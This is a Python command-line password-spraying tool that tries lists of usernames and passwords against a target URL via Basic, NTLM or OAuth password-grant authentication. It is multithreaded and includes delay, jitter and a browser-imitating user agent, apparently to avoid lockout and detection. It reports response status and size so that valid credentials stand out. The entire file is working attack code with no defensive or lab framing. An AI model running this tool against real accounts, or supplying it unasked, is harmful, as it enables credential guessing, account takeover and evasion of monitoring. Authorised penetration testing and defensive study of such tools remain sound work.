from argparse import ArgumentParser, Namespace
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any, Generator
import concurrent.futures
import json
import random
import time

from requests_ntlm import HttpNtlmAuth
from requests.auth import HTTPBasicAuth
from requests import Response
import requests


class AuthenticationError(Exception):
    def __init__(self, msg: str, response: Response) -> None:
        super().__init__(msg)
        self.response = response


def basic_auth(opts: Namespace, username: str, password: str) -> Response:
    response = requests.post(opts.target, auth=HTTPBasicAuth(username, password), headers={'User-Agent': opts.user_agent})
    if 'basic' not in response.headers.get('WWW-Authenticate', '').lower():
        raise AuthenticationError('basic authentication not supported', response)
    return response


def ntlm_auth(opts: Namespace, username: str, password: str) -> Response:
    response = requests.post(opts.target, auth=HttpNtlmAuth(username, password), headers={'User-Agent': opts.user_agent})
    if 'ntlm' not in response.headers.get('WWW-Authenticate', '').lower():
        raise AuthenticationError('ntlm authentication not supported', response)
    return response


def oauth_password_grant(opts: Namespace, username: str, password: str) -> Response:
    response = requests.post(opts.target, data=dict(client_id=opts.client_id, scope=opts.scope, username=username, password=password, grant_type='password', resource=opts.resource), headers={'User-Agent': opts.user_agent})
    return response


AUTHENTICATION_METHODS = dict(basic=basic_auth, ntlm=ntlm_auth, oauth=oauth_password_grant)


def uint(value: str) -> int:
    result = int(value)
    if result < 0:
        raise ValueError('invalid unsigned integer')
    return result


def main() -> None:
    entrypoint = ArgumentParser()
    entrypoint.add_argument('-t', '--target', metavar='URL')
    entrypoint.add_argument('-m', '--method', choices=tuple(AUTHENTICATION_METHODS), required=True, metavar='|'.join(AUTHENTICATION_METHODS))
    entrypoint.add_argument('--threads', type=uint, default=1, metavar='UINT')
    entrypoint.add_argument('--user-agent', default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6356.209 Safari/537.36', metavar='STRING')
    entrypoint.add_argument('--delay', type=uint, default=0, metavar='SECONDS')
    entrypoint.add_argument('--jitter', type=uint, default=0, metavar='SECONDS')
    group = entrypoint.add_argument_group('auth')
    group.add_argument('-u', '--user', action='append', default=[], metavar='STRING')
    group.add_argument('-U', '--users', action='append', type=Path, default=[], metavar='FILE')
    group.add_argument('-p', '--password', action='append', default=[], metavar='STRING')
    group.add_argument('-P', '--passwords', action='append', type=Path, default=[], metavar='FILE')
    group.add_argument('-c', '--credential', action='append', default=[], metavar='USER:PASS')
    group.add_argument('-C', '--credentials', action='append', type=Path, default=[], metavar='FILE')
    group = entrypoint.add_argument_group('oauth')
    group.add_argument('--client-id', default=None, metavar='UUID')
    group.add_argument('--scope', default='openid profile offline_access', metavar='STRING')
    group.add_argument('--resource', default=None, metavar='STRING')
    opts = entrypoint.parse_args()
    if not (((opts.user or opts.users) and (opts.password or opts.passwords)) or opts.credential or opts.credentials):
        print('error: users, passwords or credentials missing')
        print()
        entrypoint.print_help()
        exit(1)
    if opts.method == 'oauth' and not (opts.client_id and opts.scope and opts.resource):
        print('error: oauth requires --client-id and --resource')
        print()
        entrypoint.print_help()
        exit(1)

    try:
        for result in spray(opts):
            print(json.dumps(result))
    except AuthenticationError as e:
        print(json.dumps(dict(error=str(e), status_code=e.response.status_code, size=len(e.response.content), headers=dict(e.response.headers))))
        exit(1)


def spray(opts: Namespace) -> Generator[dict[str, Any], None, None]:
    with ThreadPoolExecutor(max_workers=opts.threads) as pool:
        futures = []
        for username in generate(opts.user, opts.users):
            for password in generate(opts.password, opts.passwords):
                future = pool.submit(authenticate, opts, (username, password))
                futures.append(future)
        for credential in generate(opts.credential, opts.credentials):
            username, password = credential.split(':', maxsplit=1)
            future = pool.submit(authenticate, opts, (username, password))
            futures.append(future)
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            yield result


def generate(entries: list[str], paths: list[Path]) -> Generator[str, None, None]:
    for entry in entries:
        yield entry
    for path in paths:
        with open(path, 'r') as file:
            for line in file:
                yield line.rstrip('\n')


def authenticate(opts: Namespace, credential: tuple[str, str]) -> dict[str, Any]:
    auth = AUTHENTICATION_METHODS[opts.method]
    username, password = credential
    response = auth(opts, username, password)
    time.sleep(random.randint(opts.delay - opts.jitter, opts.delay + opts.jitter))
    return dict(username=username, password=password, status_code=response.status_code, size=len(response.content))


if __name__ == '__main__':
    main()
